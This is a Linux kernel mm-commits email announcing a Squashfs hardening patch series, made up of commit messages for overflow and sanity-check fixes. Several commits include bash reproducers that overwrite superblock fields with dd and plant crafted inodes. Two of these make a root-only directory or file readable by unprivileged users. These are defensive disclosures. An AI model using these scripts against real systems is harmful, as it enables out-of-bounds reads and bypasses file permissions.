Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795585970;
	b=rY4hQWxhRhc41VD4RUrjbFssZ7vjMMNzxr/2t+9YLo5lC++MnFxDyt73Ie0QOFc59MaR
	 Usi54uM3/qKu5i5e8k/NycaB7HcKR1gFl+LXr6b47/4puBjdDAtI1L1FgcTkwW+z9Z3Ot
	 HtBGW2qGswX92QBF7U6FEnn1N/ibsiPze2aBCWXo8w2/ssh9LbSqEOpTUmwJN+5JG05t8
	 RyefBoNPrXebiSA3gKQlLMKvSWynjDi/8C7KCYVuwL6AXM6PI+wh9kKWcp2Z//a2LY+iA
	 o/wk3gu+fkjJ2rsXZnLEMMcMqvpJyL0HiW451/hlnO10HNE/b0J33Cddge5sNbSB5mg==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795585970;
	h=Received:DKIM-Signature:Date:To:From:In-Reply-To:References:Subject:
	 Message-Id;
	bh=QzlBqG3z883jO2gjdYjEXjLlmkJS0yORGxZh6eHiTmY=;
	b=mZiEMrZngDvYWbF4rRTIrnutsBNxNLQLdPrJ3HJKQfPiObeN56iM7HYHeZSb8IVDB5cp
	 MOeVutexo4ObRQyOK3/uaINwDSnHmdpQxBGCGLztQKCwzDZLxcshfPHvxzvRtNnoyMk8a
	 hjMxGGakEkNCPTQnAeclWGm8o5JKDcthnRJB7R+BYJJGs+8BNv5DrTE/QwF2uUolVoNxH
	 1KvAiDVtVj3h5Sj09Y34kn+PMG7Z2qET54EbviYirWq62CFZokxgaYdN/WA7lx1O5CHMB
	 qRxGfgJTs/zXLDzgrFCvAD2oev7KMC7TWqfHk/zzpgY9pczZ5ZP9TukoVs0Q49SQF4A==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=Wf8odv8V;
	arc=none smtp.remote-ip=100.103.45.18
Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 09680606A321
	for <mm-commits@vger.kernel.org>; Wed, 25 Nov 2026 05:52:49 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=Wf8odv8V
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 581BD1F000C0;
	Wed, 25 Nov 2026 05:52:49 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
	d=linux-foundation.org; s=korg; t=1795585969;
	bh=QzlBqG3z883jO2gjdYjEXjLlmkJS0yORGxZh6eHiTmY=;
	h=Date:To:From:In-Reply-To:References:Subject;
	b=Wf8odv8VJ1+k4G+YVjMAC/3gVncvsS4kDLpc+JUUO/fDw2JM3r1+26xwDXGnyNsi3
	 RO7klqVLJTjohKrSpnEigJRt+SdJD9zIaQgWpEB2xgbG5rQM6f0UhFnuDxLFlSh4Fj
	 FJz4WU0DXta/GzvJsPPpgCWENsW+7ZU4hgq/1Dvg=
Date: Tue, 24 Nov 2026 21:52:48 -0800
To: mm-commits@vger.kernel.org,akpm@linux-foundation.org
From: Andrew Morton <akpm@linux-foundation.org>
In-Reply-To: <20261123034304.261742-2-phillip@squashfs.org.uk>
References: <20261123034304.261742-2-phillip@squashfs.org.uk>
Subject: + a.patch added to mm-nonmm-unstable branch
Message-Id: <20261125055249.581BD1F000C0@smtp.kernel.org>
X-Mailing-List: mm-commits@vger.kernel.org
List-Id: <mm-commits.vger.kernel.org>
List-Post: <mailto:mm-commits@vger.kernel.org>
List-Help: <mailto:mm-commits+help@vger.kernel.org>
List-Subscribe: <mailto:mm-commits+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:mm-commits+unsubscribe@vger.kernel.org>
List-Owner: <mailto:mm-commits+owner@vger.kernel.org>
Precedence: list


The patch titled
     Subject: a
has been added to the -mm mm-nonmm-unstable branch.  Its filename is
     a.patch

This patch will shortly appear at
     https://git.kernel.org/pub/scm/linux/kernel/git/akpm/25-new.git/tree/patches/a.patch

This patch will later appear in the mm-nonmm-unstable branch at
    git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm

Before you just go and hit "reply", please:
   a) Consider who else should be cc'ed
   b) Prefer to cc a suitable mailing list as well
   c) Ideally: find the original patch on the mailing list and do a
      reply-to-all to that, adding suitable additional cc's

*** Remember to use Documentation/process/submit-checklist.rst when testing your code ***

The -mm tree is included into linux-next via various
branches at git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm
and is updated there most days

------------------------------------------------------
From: Andrew Morton <akpm@linux-foundation.org>
Subject: a
Date: Tue Nov 24 09:40:34 PM PST 2026
Subject: Squashfs: convert SQUASHFS_COMPRESSED_* to inline functions
Date: Mon, 23 Nov 2026 03:42:42 +0000

Patch series "Squashfs: fix a lot of AI issues and AI style issues", v3.

This large patch-set is inspired by the recent spate of AI generated code
reports.  Four of the patches directly fix AI reported issues, and the
rest have been found manually by a read-through and testing of the code.

In all cases (except patches 1 - 8, 18 - 20) the patches deal with
over-sights relating to variable overflow, arithmetic overflow, variable
signedness or just lack of sanity checking of data read from disk.  These
can cause the code to fail, and which could be used as a potential
exploit.

Patches 18, 19, and 20 fix potential excessive memory use exploits.  The
code in question was written in the early days when Squashfs filesystems
were small, but with very large filesystems it could try to allocate
memory in excess of 4 MiB, and up to 64 MiB.

The patches can be broken down as follows:

Patches 1 - 6 are preparatory patches.  They convert old fashioned
#define macros into inline functions.  These being typed make widths and
signedness explicit, and allow additional checking to be added in later
patches.

Patch 7 fixes an incorrect offset value in TRACE statements in
squashfs_read_inode().  This was new to the v2 patch-set.

Patch 8 is new to this v3 patch-set.  The patch is an attempt to stop
Sashiko from getting stuck in logical contradictions when some
sanity checks are introduced later.

Patches 9 - 17 fix various issues relating to variable overflow,
arithmetic overflow and add additional sanity checking to prevent these
issues from occurring.

Patches 18 - 20 remove the excessive allocation of memory by introducing
caches, which limit the maximum usage to 4 pages.

Patches 21 - 22 were new to the v2 patch-set.  They deal with some
issues Sashiko reported in the original patch-set.

Patch 23 was also new to the v2 patch-set.  It adds an additional belts
and braces sanity check.

Patches 9 - 21 have reproducers which show how the existing code faults
can be exploited, in some cases which can allow a Squashfs filesystem
to be tampered with to make files readable by unprivileged users.


This patch (of 23):

Convert old fashioned #define macros into inline functions.  This has
the following improvements:

1. Inline functions are typed, which makes the width and signedness of
   input and outputs explicit, which reduces errors.

2. The inline functions enable more sanity checking to be added in
   later commits.

3. Inline functions are easier to read than #define macros, which
   improves code comprehension.

Link: https://lore.kernel.org/20261123034304.261742-1-phillip@squashfs.org.uk
Link: https://patch.msgid.link/20261123034304.261742-2-phillip@squashfs.org.uk
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: convert SQUASHFS_INODE_* and SQUASHFS_MKINODE to inline functions
Date: Mon, 23 Nov 2026 03:42:43 +0000

Convert old fashioned #define macros into inline functions.  This has
the following improvements:

1. Inline functions are typed, which makes the width and signedness of
   input and outputs explicit, which reduces errors.

2. The inline functions enable more sanity checking to be added in
   later commits.

3. Inline functions are easier to read than #define macros, which
   improves code comprehension.

Link: https://patch.msgid.link/20261123034304.261742-3-phillip@squashfs.org.uk
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: convert SQUASHFS_FRAGMENT_* to inline functions
Date: Mon, 23 Nov 2026 03:42:44 +0000

Convert old fashioned #define macros into inline functions.  This has
the following improvements:

1. Inline functions are typed, which makes the width and signedness of
   input and outputs explicit, which reduces errors.

2. The inline functions enable more sanity checking to be added in
   later commits.

3. Inline functions are easier to read than #define macros, which
   improves code comprehension.

Link: https://patch.msgid.link/20261123034304.261742-4-phillip@squashfs.org.uk
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: convert SQUASHFS_LOOKUP_* to inline functions
Date: Mon, 23 Nov 2026 03:42:45 +0000

Convert old fashioned #define macros into inline functions.  This has
the following improvements:

1. Inline functions are typed, which makes the width and signedness of
   input and outputs explicit, which reduces errors.

2. The inline functions enable more sanity checking to be added in
   later commits.

3. Inline functions are easier to read than #define macros, which
   improves code comprehension.

Link: https://patch.msgid.link/20261123034304.261742-5-phillip@squashfs.org.uk
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: convert SQUASHFS_ID_* to inline functions
Date: Mon, 23 Nov 2026 03:42:46 +0000

Convert old fashioned #define macros into inline functions.  This has
the following improvements:

1. Inline functions are typed, which makes the width and signedness of
   input and outputs explicit, which reduces errors.

2. The inline functions enable more sanity checking to be added in
   later commits.

3. Inline functions are easier to read than #define macros, which
   improves code comprehension.

Link: https://patch.msgid.link/20261123034304.261742-6-phillip@squashfs.org.uk
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: convert SQUASHFS_XATTR_* to inline functions
Date: Mon, 23 Nov 2026 03:42:47 +0000

Convert old fashioned #define macros into inline functions.  This has
the following improvements:

1. Inline functions are typed, which makes the width and signedness of
   input and outputs explicit, which reduces errors.

2. The inline functions enable more sanity checking to be added in
   later commits.

3. Inline functions are easier to read than #define macros, which
   improves code comprehension.

Link: https://patch.msgid.link/20261123034304.261742-7-phillip@squashfs.org.uk
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: fix offset in squashfs_read_inode() TRACE statements
Date: Mon, 23 Nov 2026 03:42:48 +0000

The offset used in the TRACE statements has been advanced past the start
of the inode header by the squashfs_read_metadata() call.  This means
the offset printed is incorrect.

Fix this by using the original offset, which is obtained by calling
squashfs_inode_offset(ino).

Link: https://patch.msgid.link/20261123034304.261742-8-phillip@squashfs.org.uk
Fixes: 6545b246a2c8 ("Squashfs: inode operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: don't compute start or alloc memory on empty directory or index
Date: Mon, 23 Nov 2026 03:42:49 +0000

If a directory is empty (length equals 3), then there is no data to be
read from the filesystem.

This means we can optimise directory reading and lookup with empty
directories by skipping allocating memory to read data into, and
also skip computing the start location.

If the directory index is also empty, we can also skip allocating
memory when reading the index.

This commit also fixes the TRACE statements to display the start
and offset of the directory data within the directory table,
rather than the computed location on disk, or the incremented values
after squashfs_read_metadata() has been called.

It also adds sanity checks to ensure that the directory length is not
less than 3 bytes.

Link: https://patch.msgid.link/20261123034304.261742-9-phillip@squashfs.org.uk
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: squashfs-dont-compute-start-or-alloc-memory-on-empty-directory-or-index-fix
Date: Sun Nov 22 11:49:59 PM PST 2026

s/inode/dir/ in TRACE statement

Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: Phillip Lougher <phillip@squashfs.org.uk>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: fix fragment bytes overflow on 32-bit architectures
Date: Mon, 23 Nov 2026 03:42:50 +0000

In helper function squashfs_fragment_bytes() the u32 fragments
variable is multiplied by sizeof(struct squashfs_fragment_enty).

On a 32-bit architecture the type of sizeof() is a 32-bit unsigned
integer, which means the computation will overflow for fragments
values above 268435455.

The knock-on effect is the size of the in memory fragment index
table will be incorrectly computed, and a much smaller than expected
index table will be allocated and read into memory.

Later when a fragment index beyond this is looked up in this table,
this will produce an out of bounds access.

The fix is to explicitly widen the fragments variable to a long long
in the squashfs_fragment_bytes() helper function.

Reproducer
=========

The following script when run on a 32-bit x86 kernel (which lacks
KASAN support) will produce an I/O error.  On a 32-bit ARM kernel
with KASAN enabled, the out of bounds access will also produce a
KASAN report.

[  193.817260] ==================================================================
[  193.818057] BUG: KASAN: slab-out-of-bounds in squashfs_frag_lookup+0x23c/0x264
[  193.820408] Read of size 8 at addr cc126708 by task stat/357
[  193.820720]
[  193.821675] CPU: 3 UID: 0 PID: 357 Comm: stat Not tainted 7.2.0-13187-g66498c75b4f8 #113 VOLUNTARY

=================================================================
#!/bin/bash

ARGS="-no-duplicates -no-sparse -no-hardlinks -quiet -no-progress"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

# Create a Squashfs filesystem with 1026 files and 513 fragments.
# This will create a two entry Squashfs fragment index table.
#
DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

# Create a Squashfs pseudo file which is fed to Mksquashfs
echo Create a Squashfs pseudo file which is fed to Mksquashfs

dd if=/dev/urandom of=urandom bs=1024 count=50 status=none
for i in $(seq 1 1026); do
	echo "$i l urandom" >> pseudo
done

# Create the Squashfs filesystem
echo Create the Squashfs filesystem

if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0777 0 0" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish

fi

# The fragments field (fragment count) in the superblock is at offset
# 16 bytes.
#
# Over-write the fragments count with 268,435,457 little-endian.  On a
# 32-bit architecture, this when multiplied by 16 will overflow, giving
# the value 16.
#
# Ultimately this will cause the kernel code to create and read a single
# entry index table (where in fact the table has two entries).
#
# Then stating file 999 which has a fragment id in the second index,
# will cause an out of bounds access.

# Write 268,435,457 in little-endian format to file
/usr/bin/echo -en "\x01\x00\x00\x10" > file

# Over-write the fragments count in the superblock
echo Over-write the fragments count in the superblock

dd bs=1 seek=16 if=file of=img.sqsh count=4 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

# Stat file 999
echo Stat file 999

stat /mnt/999

popd 2>&1 > /dev/null

rm -rf $DIR
=================================================================

Link: https://patch.msgid.link/20261123034304.261742-10-phillip@squashfs.org.uk
Fixes: ffae2cd73a9e ("Squashfs: header files")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: fix fragment index table length too large exploit
Date: Mon, 23 Nov 2026 03:42:51 +0000

An attacker can manipulate the fragment count and the fragment table
start values in the superblock, and force the code to kmalloc()
a 4 Mbyte memory region, or try to allocate larger values which
will fail with a warning, and which will panic the kernel if panic on
warn is set.

If the allocation succeeds, these invalid values will be caught when the
code tries to read the data from disk, but, this leaves a small time
window where the 4 Mbyte block is allocated before being freed when
the mount of the filesystem fails.

The exploit relies on arithmetic overflow to evade the following sanity
check:

	if (fragment_table_start + length > next_table)

Specifically, the values of fragment_table_start and length can be
chosen so that they overflow an unsigned long long, and so appear less
than next_table.

Typically, the maximum memory that can be allocated with kmalloc() is
4 Mbytes.  So if length is 4 Mbytes, this means fragment_table_start
needs to be 2^64 - 4 Mbytes, to achieve overflow and produce a zero
length.

This value is beyond the end of any block device, because the maximum
block device is 2^63 - 512 in size (LLONG_MAX >> 9 sectors of 512
bytes).

In practice this means such a large value will be caught when the code
immediately after allocation tries to read the data off disk:

 	table = squashfs_read_table(sb, fragment_table_start, length);

However, the code should check for validity before allocating a large
kmalloc() area, because such allocations can cause memory pressure or
cause the kernel to panic.

This commit checks that fragment_tables_size is not too large, and
ensures arithmetic overflow does not occur.

It also makes the sanity check more exacting by utilising the fact that
there should be zero gap between the end of the fragment index table and
the next table.

Reproducer
=========

The following script if the eploit works, will fail with the mount
error

mount: attempt to access beyond end of device

=================================================================
#!/bin/bash

ARGS="-quiet -no-progress"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

# Create a Squashfs filesystem with a single file.
#
DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

echo Create the Squashfs filesystem

if ! mksquashfs - img.sqsh -p "/ d 0777 0 0" -p "/file f 0777 0 0 echo hello" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish

fi

# The fragments field (fragment count) in the superblock is at offset
# 16 bytes.
#
# Over-write the fragments count with 268,435,456 little-endian.
# This will make the kernel try to kmalloc() 4 Mbytes to hold the
# fragment index table.
#

# Write 268,435,456 in little-endian format to file
/usr/bin/echo -en "\x00\x00\x00\x10" > file

# Over-write the fragments count in the superblock
echo Over-write the fragments count in the superblock

dd bs=1 seek=16 if=file of=img.sqsh count=4 conv=notrunc status=none

# The fragment table start (start of the index table) in the superblock
# is at offset 72 bytes.
#
# Over-write the value with 2^64 - 4 Mbytes little-endian.
# This value with the index table length will overflow an unsigned
# long long, giving the value 0.  This will evade the sanity check.

# Write 2^64 - 4 Mbytes in little-endian format to file
/usr/bin/echo -en "\x00\x00\xc0\xff\xff\xff\xff\xff" > file

# Over-write the fragment table start in the superblock
echo Over-write the fragment table start in the superblock

dd bs=1 seek=80 if=file of=img.sqsh count=8 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

# If the eploit works, the mount will fail with
# mount: attempt to access beyond end of device

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

popd 2>&1 > /dev/null

rm -rf $DIR
=================================================================

Link: https://patch.msgid.link/20261123034304.261742-11-phillip@squashfs.org.uk
Fixes: 1cac63cc9b2f ("Squashfs: add sanity checks to fragment reading at mount time")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: sanity check inode metadata block location
Date: Mon, 23 Nov 2026 03:42:52 +0000

An inode reference in Squashfs is represented as a tuple, the location
of the compressed metadata block the inode is in, and the offset into
the uncompressed block.  The location is not absolute and it is instead
encoded as an offset from the start of the inode table.

An attacker could manipulate the inode reference to make it point to a
replacement malicious inode stored elsewhere, outside the inode table.
This is because the code does not check that the location is valid and
is within the inode table.

In practice this exploit is hard to achieve because metadata in Squashfs
is compressed by default, and so the compressed metadata cannot be
directly altered.  In addition due to sanity checking at mount time
there are no gaps in the filesystem to hide a malicious inode.

Also anyone with access to Mksquahfs/Unsquashfs can copy and recreate
the filesystem incorporating whatever changes they want.

However there are a number of exploit scenarios here.  Many embedded
systems or secure systems have deliberately restricted installations
with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
due to this bug can be achieved with only echo and dd.

An example exploit is where a Squashfs filesystem root directory has
permissions 0700 (u=rxw), where only the superuser can enter the
directory and access the content within. But using this bug an attacker
could place a malicious root inode in the inode lookup table (used by
NFS) which has the permissions changed to 0777 (a=rwx), and then update
the root_inode field in the superblock to point to that.  On
reboot/remount this will make the directory accesisible to unprivileged
users.

The following shell script acts as a reproducer and proof of concept.

This commit blocks such attempts by adding a new helper
squashfs_inode_start() which adds additional sanity checking, first
ensuring no arithmetic operations overflow, and second checking that
the inode is within the inode table.

Reproducer
==========

The following Bash script uses echo and dd to achieve the previously
discussed exploit.  If the exploit is successful the root directory
permisions will be changed to 0777 (a=rwx), but otherwise the filesystem
is unchanged.

======================================================================
#!/bin/bash

ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

# Create a Squashfs pseudo file which is fed to Mksquashfs
echo Create a Squashfs pseudo file which is fed to Mksquashfs

dd if=/dev/zero of=zero bs=1024 count=1 status=none
for i in $(seq 1 100); do
	echo "$i l zero" >> pseudo
done

# Create a Squashfs filesystem with the root directory permissions u=rwx (0700)
echo "Create a Squashfs filesystem with the root directory permissions u=rwx (0700)"

if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0700 0 0" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish
fi

# The root_inode field in the superblock points to the compressed metadata
# block and offset within it, where the root inode is stored.
#
# Create a malicious root inode and hide it in the inode lookup table.
# Because of mount time checking, there are no gaps between metadata tables
# where it can be hidden, and it can't be hidden after the file system end,
# because this is checked.

# Write malicious inode, this is the same as the original root inode, except
# it is uncompressed, and the permissions are set to 0777.
/usr/bin/echo -en "\x20\x80\x01\x00\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\
\x65\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xec\x03\x00\x00\x00\x00\x00\
\x00" > file

# Place new root inode inside the inode lookup table
echo Place new root inode inside the inode lookup table

dd bs=1 seek=960 if=file of=img.sqsh count=34 conv=notrunc status=none

# Update the root_inode field in the superblock to point to our new inode
# The start block is an offset from the inode_table_start, and not an
# absolute value.  The start of the inode table is 113, the new inode
# is placed at position 964, and so the offset is 851. Because we've only
# stored one inode in the metadata block, the offset into that block is 0.
#
echo Update the root_inode field in the superblock to point to our new inode

/usr/bin/echo -en "\x00\x00\x4f\x03" > file

dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

# Stat /mnt, if the exploit is successful, permissions should be 0777
echo Stat /mnt, if the exploit is successful, permissions should be 0777

stat /mnt

popd 2>&1> /dev/null

rm -rf $DIR
======================================================================

Link: https://patch.msgid.link/20261123034304.261742-12-phillip@squashfs.org.uk
Fixes: 6545b246a2c8 (" Squashfs: inode operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: sanity check directory metadata block location
Date: Mon, 23 Nov 2026 03:42:53 +0000

The contents of directories are stored in compressed metadata blocks,
which are placed in the directory table.  The location of a directory
is thus represented as a tuple, the location of the compressed metadata
block that the directory is in, and the offset into the uncompressed
block.  The block location is not absolute, and it is instead encoded
as an offset from the start of the directory table.

An attacker could manipulate the directory block location to make it
point to a replacement malicious directory stored elsewhere, outside
the directory table.  This is because the code does not check that the
location is valid and is within the directory table.

In practice this exploit is hard to achieve because metadata in Squashfs
is compressed by default, and so the compressed metadata cannot be
directly altered.  In addition due to sanity checking at mount time
there are no gaps in the filesystem to store a malicious directory.

Also anyone with access to Mksquashfs/Unsquashfs can copy and recreate
the filesystem incorporating whatever changes they want.

However, there are a number of exploit scenarios here.  Many embedded
systems or secure systems have deliverately restricted installations
with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
due to this bug can be achieved with only echo and dd.

An example exploit is where a Squashfs filesystem has a file in the
root directory with permissions 0700 (u=rxw), where only the superuser
can read it.  But using this bug an attacker could create a malicious
replacement directory in the inode lookup table (used by NFS), that
points to a malicious replacement inode that has the permissions
changed to 0777 (a=wrx).  On reboot/remount this would make the
file readable by unprivileged users.

The following shell script acts as a reproducer and proof of concept.

This commit blocks such attempts by adding a new helper
squashfs_dir_start() which adds additional sanity checking, first
ensuring no arithmetic operations overflow, and second checking that
the directory is within the directory table.

Reproducer
==========

The following Bash script uses echo and dd to achieve the previously
discussed exploit.  If the exploit is successful the file "data"
permissions will be changed to 0777 (a=rwx), but otherwise the
filesystem is unchanged.

===================================================================
#!/bin/bash

ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

# Create a Squashfs pseudo file which is fed to Mksquashfs
echo Create a Squashfs pseudo file which is fed to Mksquashfs

dd if=/dev/zero of=zero bs=1024 count=1 status=none
echo "data f 0700 0 0 echo some data" >> pseudo
echo "files d 0777 0 0" >> pseudo
for i in $(seq 1 100); do
	echo "files/$i f 0655 1000 1000 cat zero" >> pseudo
done

# Create a Squashfs filesystem
echo "Create a Squashfs filesystem"

if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0777 0 0" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish
fi

# Exploit: The file named "data" has permissions 0700, which can only be
# read by the superuser.  The desire is to change the permissions on
# the file to be 0777, which can be read by unprivileged users.
#
# Due to compression of the metadata, this cannot be done by directly
# writing to the metadata tables.  Instead the real metadata is replaced
# by malicious metadata starting from the "data" file inode upwards to
# the root inode.
#
# This is a three step process.
#
# 1. A new "data" file inode is placed within the inode lookup table
# 2. A new root directory which points to the new "data" file inode is
#    placed in the inode lookup table
# 3. A new root inode which pounts to the new root directory table is
#    placed in the inode lookup table.
#
# For brevity this reproducer uses pre-computed data for the above.

# Write malicious inode for file "data", this is the same as the
# original except it is uncompressed, and the permissions are set to
# 0777.
echo Writing malicious inode for file \"data\"

/usr/bin/echo -en "\x20\x80\x02\x00\xFF\x01\x00\x00\x00\x00\x00\x00\
\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x0A\x00\x00\x00" > file

dd bs=1 seek=1034 if=file of=img.sqsh count=34 conv=notrunc status=none

# Write directory data which points to the malicious inode
echo Writing root directory which points to malicious inode

/usr/bin/echo -en "\x31\x80\x00\x00\x00\x00\x90\x03\x00\x00\x01\x00\x00\
\x00\x00\x00\x00\x00\x02\x00\x03\x00\x64\x61\x74\x61\x00\x00\x00\x00\
\x00\x00\x00\x00\x02\x00\x00\x00\xA0\x0C\x00\x00\x01\x00\x04\x00\x66\
\x69\x6c\x65\x73" > file

dd bs=1 seek=983 if=file of=img.sqsh count=51 conv=notrunc status=none

#
# Write root inode, this is the same as the original root inode, except
# it is uncompressed, and it points to the new directory data
echo Writing root inode which points to the new root directory

/usr/bin/echo -en "\x20\x80\x01\x00\xFF\x01\x00\x00\x00\x00\x00\x00\
\x00\x00\x67\x00\x00\x00\x43\x02\x00\x00\x03\x00\x00\x00\x34\x00\x00\
\x00\x00\x00\x00\x00" > file

dd bs=1 seek=949 if=file of=img.sqsh count=34 conv=notrunc status=none

# Update the root_inode field in the superblock to point to our new
# root inode.  The start block is an offset from the inode_table_start,
# and not an absolute value.  The start of the inode table is 122, the
# new inode is placed at position 949, and so the offset is 827. Because
# we've only stored one inode in the metadata block, the offset into
# that block is 0.
echo Updating the root_inode field in the superblock

/usr/bin/echo -en "\x00\x00\x3B\x03" > file

dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

# Stat /mnt/data, if the exploit is successful, permissions should be 0777
echo "************************************************************************"
echo Stat /mnt/data, if the exploit is successful, permissions should be 0777

stat /mnt/data

popd 2>&1> /dev/null

rm -rf $DIR
=====================================================================

Link: https://patch.msgid.link/20261123034304.261742-13-phillip@squashfs.org.uk
Fixes: c88da2c97936 ("Squashfs: directory lookup operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
